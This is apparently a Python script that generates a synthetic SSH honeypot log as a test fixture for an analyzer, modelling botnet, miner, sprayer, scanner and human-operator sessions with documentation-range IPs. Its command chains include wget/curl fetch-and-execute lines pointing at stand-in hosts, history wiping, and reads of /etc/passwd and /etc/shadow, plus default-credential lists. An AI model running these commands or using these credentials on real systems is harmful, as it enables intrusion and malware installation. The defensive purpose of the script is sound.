"""
simulate_attacks.py — generates a realistic sample log.

WHY THIS EXISTS
---------------
A honeypot only collects data when it is exposed to the internet, and a fresh
one sees nothing for hours. That makes the analyzer impossible to demo and
impossible to test. This script writes a log file in exactly the format
honeypot.py produces, containing attack patterns modelled on how real SSH
scanners behave, so the analysis pipeline can be run and checked immediately.

It is a TEST FIXTURE, not evidence. The analyzer cannot tell the difference —
which is the point, because that is what makes it a valid test of the analyzer.
Every report generated from this file says so at the top.

ABOUT THE IP ADDRESSES
----------------------
Every source IP here is from a range RFC 5737 reserves for documentation
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24). These can never be routed on
the public internet, so no real machine or network is implicated by this sample
data. Inventing plausible-looking "real" attacker IPs for a demo would risk
pointing a finger at an innocent host.

THE PATTERNS MODELLED
---------------------
  1. Mirai-style IoT botnet — identical command chain, millisecond gaps
  2. Cryptomining dropper — recon for CPU, then fetch and run a miner
  3. Credential sprayer   — many logins, zero commands
  4. Port scanner         — connects, grabs the banner, leaves
  5. Human operator       — slow, exploratory, makes typos
"""

import json
import os
import random
import uuid
from datetime import datetime, timedelta, timezone

OUT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "logs", "sample_attacks.jsonl")

# Reproducible output: the same seed gives the same log every run, so a result
# you report can be regenerated and checked by someone else.
random.seed(1337)

# --- source populations (all RFC 5737 documentation addresses) ---
BOTNET_IPS = ["192.0.2.14", "192.0.2.57", "192.0.2.103", "198.51.100.22", "198.51.100.91"]
MINER_IPS = ["203.0.113.8", "203.0.113.44"]
SPRAYER_IPS = ["198.51.100.5", "198.51.100.77", "192.0.2.200"]
SCANNER_IPS = ["203.0.113.101", "203.0.113.150", "192.0.2.31"]
HUMAN_IPS = ["198.51.100.42", "203.0.113.77"]

# SSH client banners. Library banners belong to tooling; OpenSSH to people.
BOT_BANNERS = ["SSH-2.0-libssh2_1.9.0", "SSH-2.0-libssh-0.9.6", "SSH-2.0-Go"]
SCANNER_BANNERS = ["SSH-2.0-Go", "SSH-2.0-libssh2_1.10.0"]
HUMAN_BANNERS = ["SSH-2.0-OpenSSH_9.3", "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4",
                 "SSH-2.0-PuTTY_Release_0.78"]

# Credential dictionaries these families are known to run.
BOT_CREDS = [("root", "root"), ("root", "admin"), ("root", "123456"), ("admin", "admin"),
             ("root", "vizxv"), ("root", "xc3511"), ("support", "support"), ("root", "1234")]
SPRAY_CREDS = [("root", "root"), ("admin", "admin"), ("ubuntu", "ubuntu"), ("test", "test"),
               ("oracle", "oracle"), ("postgres", "postgres"), ("git", "git"),
               ("pi", "raspberry"), ("user", "password"), ("deploy", "deploy123"),
               ("jenkins", "jenkins"), ("ftpuser", "ftpuser")]

# Command chains. Each is one complete attack sequence, in order.
MIRAI_CHAIN = [
    "/bin/busybox ECCHI",
    "cat /proc/cpuinfo",
    "cd /tmp || cd /var/run || cd /mnt",
    "wget http://192.0.2.250/bins/arm7 -O .x",
    "chmod 777 .x",
    "./.x ssh",
    "rm -rf .x",
    "history -c",
]
MINER_CHAIN = [
    "uname -a",
    "nproc",
    "free -m",
    "cat /proc/cpuinfo | grep 'model name' | head -1",
    "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh",
    "chmod +x /tmp/s.sh",
    "/tmp/s.sh",
    "crontab -l",
]
HUMAN_CHAIN = [
    "whoami", "id", "uname -a", "ls -la", "cat /etc/passwd", "ps",
    "df -h", "cat /root/notes.txt", "ls /home/deploy", "cat /etc/shadow",
    "netstat -tulpn", "exit",
]


def _ts(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).isoformat()


class LogWriter:
    """Writes events with caller-supplied timestamps, so sessions can be
    scattered across several days instead of all landing at 'now'."""

    def __init__(self, path):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        self.f = open(path, "w", encoding="utf-8")

    def write(self, event):
        self.f.write(json.dumps(event) + "\n")

    def close(self):
        self.f.close()


def emit_session(w: LogWriter, *, start: datetime, src_ip: str, banner: str,
                 creds: list, commands: list, gap_fn, backspace_fn=lambda: 0,
                 end_reason="closed"):
    """
    Write one complete session: start, auths, commands, end.

    gap_fn()       returns the delay before each command — this is the knob that
                   makes a session look automated or human.
    backspace_fn() returns typing corrections for a command.
    """
    sid = str(uuid.uuid4())[:8]
    clock = start

    w.write({"event": "session_start", "ts": _ts(clock), "session_id": sid,
             "src_ip": src_ip, "src_port": random.randint(30000, 65000),
             "client_banner": banner})

    for i, (user, pwd) in enumerate(creds):
        clock += timedelta(seconds=random.uniform(0.05, 0.4))
        w.write({"event": "auth_attempt", "ts": _ts(clock), "session_id": sid,
                 "src_ip": src_ip, "username": user, "password": pwd,
                 # Only the final guess "succeeds" — mirrors how the real
                 # honeypot behaves when it accepts a login.
                 "accepted": i == len(creds) - 1})

    for i, cmd in enumerate(commands):
        gap = gap_fn()
        clock += timedelta(seconds=gap)
        w.write({"event": "command", "ts": _ts(clock), "session_id": sid,
                 "src_ip": src_ip, "command": cmd,
                 "seconds_since_prev": round(0.0 if i == 0 else gap, 4),
                 "backspaces": backspace_fn()})

    clock += timedelta(seconds=random.uniform(0.1, 1.0))
    w.write({"event": "session_end", "ts": _ts(clock), "session_id": sid,
             "src_ip": src_ip,
             "duration_s": round((clock - start).total_seconds(), 3),
             "command_count": len(commands), "auth_attempts": len(creds),
             "reason": end_reason})


def main():
    w = LogWriter(OUT_PATH)
    # Seven days of traffic ending now.
    base = datetime.now(timezone.utc) - timedelta(days=7)
    sessions = 0

    # --- 1. IoT botnet. Same chain every time, machine-fast, no typos. ------
    # Scanning peaks in the small hours UTC because infected consumer devices
    # run on a schedule, not an office day.
    for _ in range(38):
        day = random.randint(0, 6)
        hour = random.choice([0, 1, 2, 3, 4, 5, 21, 22, 23])
        start = base + timedelta(days=day, hours=hour, minutes=random.randint(0, 59))
        emit_session(
            w, start=start, src_ip=random.choice(BOTNET_IPS),
            banner=random.choice(BOT_BANNERS),
            creds=[random.choice(BOT_CREDS)],
            commands=MIRAI_CHAIN,
            # 40–90 ms between commands: a pipe, not a keyboard.
            gap_fn=lambda: random.uniform(0.04, 0.09),
        )
        sessions += 1

    # --- 2. Cryptomining dropper. Slightly slower, still automated. ---------
    for _ in range(11):
        start = base + timedelta(days=random.randint(0, 6),
                                 hours=random.randint(0, 23),
                                 minutes=random.randint(0, 59))
        emit_session(
            w, start=start, src_ip=random.choice(MINER_IPS),
            banner="SSH-2.0-libssh2_1.10.0",
            creds=[("root", "root"), ("root", "toor")],
            commands=MINER_CHAIN,
            gap_fn=lambda: random.uniform(0.12, 0.31),
        )
        sessions += 1

    # --- 3. Credential sprayer. Many logins, never runs anything. -----------
    for _ in range(16):
        start = base + timedelta(days=random.randint(0, 6),
                                 hours=random.randint(0, 23),
                                 minutes=random.randint(0, 59))
        emit_session(
            w, start=start, src_ip=random.choice(SPRAYER_IPS),
            banner=random.choice(BOT_BANNERS),
            creds=random.sample(SPRAY_CREDS, random.randint(5, 10)),
            commands=[],
            gap_fn=lambda: 0.0,
            end_reason="no_shell_request",
        )
        sessions += 1

    # --- 4. Port scanner. Handshake, banner, gone. --------------------------
    for _ in range(13):
        start = base + timedelta(days=random.randint(0, 6),
                                 hours=random.randint(0, 23),
                                 minutes=random.randint(0, 59))
        emit_session(
            w, start=start, src_ip=random.choice(SCANNER_IPS),
            banner=random.choice(SCANNER_BANNERS),
            creds=[],
            commands=[],
            gap_fn=lambda: 0.0,
            end_reason="no_channel",
        )
        sessions += 1

    # --- 5. Human operator. Slow, hesitant, makes typos. --------------------
    for _ in range(5):
        # Daytime hours — people work when they are awake.
        start = base + timedelta(days=random.randint(0, 6),
                                 hours=random.randint(9, 18),
                                 minutes=random.randint(0, 59))
        n = random.randint(7, 12)
        emit_session(
            w, start=start, src_ip=random.choice(HUMAN_IPS),
            banner=random.choice(HUMAN_BANNERS),
            creds=[("root", random.choice(["root", "admin", "P@ssw0rd"]))],
            commands=HUMAN_CHAIN[:n],
            # Seconds, and wildly variable: reading output and deciding.
            gap_fn=lambda: random.uniform(1.8, 14.0),
            # Typos most of the time, as a person typing would.
            backspace_fn=lambda: random.choice([0, 0, 1, 2, 3, 5]),
        )
        sessions += 1

    w.close()
    print(f"[*] Wrote {sessions} simulated sessions to {OUT_PATH}")
    print("[*] This is synthetic test data (RFC 5737 documentation IPs), not real captures.")
    print("[*] Analyze it with:  python3 analyze.py --log logs/sample_attacks.jsonl")


if __name__ == "__main__":
    main()
